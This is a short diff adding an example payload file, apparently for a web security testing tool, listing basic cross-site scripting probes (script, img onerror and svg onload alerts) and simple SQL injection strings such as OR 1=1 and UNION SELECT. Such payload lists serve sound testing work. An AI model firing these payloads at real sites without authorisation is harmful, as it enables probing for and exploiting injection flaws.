@@ -1,0 +1,14 @@
+# Custom Payload Example
+# Add your own payloads here and load them via PayloadManager
+
+# XSS Payloads
+<script>alert('Custom-XSS')</script>
+<img src=x onerror="alert('Custom')">
+<svg/onload=alert('Custom')>
+
+# SQL Injection Payloads
+' OR '1'='1
+" OR "1"="1
+' UNION SELECT NULL--
+
+# Add more payloads below...
